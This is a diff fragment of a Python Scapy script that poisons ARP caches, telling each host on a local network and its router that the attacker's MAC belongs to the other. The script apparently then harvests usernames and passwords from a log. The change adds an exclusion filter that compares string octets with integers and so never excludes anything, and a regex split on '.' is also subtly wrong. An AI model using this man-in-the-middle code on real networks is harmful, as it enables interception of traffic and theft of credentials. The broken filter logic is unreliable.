@@ -86,25 +86,26 @@ if __name__ == "__main__":
             # send arp relies spoofing
             print(" ")
             for j in range(0,len(ip)):
-                print(len(re.split(".",ip[j])))
-                victimpacket = ARP( op      =  2,
-                                    pdst    = ip[j],            # victim's IP
-                                    hwdst   = mac[j],           # victim's MAC 
-                                    psrc    = routerIp,         # router's IP
-                                    hwsrc   =  hostmac)         # attacker's MAC
-                routerpacket = ARP( op      =   2,
-                                    pdst    =   routerIp,       # router's IP
-                                    hwdst   =   routerMac,      # router's MAC
-                                    psrc    =   ip[j],          # victim's IP
-                                    hwsrc   =   hostmac)        # attacker's MAC
+                if(ip[j].split(".")[3] != 3 and ip[j].split(".")[3] != 254):
+                    print(len(re.split(".",ip[j])))
+                    victimpacket = ARP( op      =  2,
+                                        pdst    = ip[j],            # victim's IP
+                                        hwdst   = mac[j],           # victim's MAC 
+                                        psrc    = routerIp,         # router's IP
+                                        hwsrc   =  hostmac)         # attacker's MAC
+                    routerpacket = ARP( op      =   2,
+                                        pdst    =   routerIp,       # router's IP
+                                        hwdst   =   routerMac,      # router's MAC
+                                        psrc    =   ip[j],          # victim's IP
+                                        hwsrc   =   hostmac)        # attacker's MAC
 
-                # verbose=0 : make the function totally silent
-                # More : help(send)
-                # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
-                send(victimpacket, verbose=0)
-                send(routerpacket, verbose=0)
-                if(sending_flag):
-                    print("Send to: ",ip[j]," ",mac[j])
+                    # verbose=0 : make the function totally silent
+                    # More : help(send)
+                    # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
+                    send(victimpacket, verbose=0)
+                    send(routerpacket, verbose=0)
+                    if(sending_flag):
+                        print("Send to: ",ip[j]," ",mac[j])
 
             # get all username and password in log file
             print(" ")
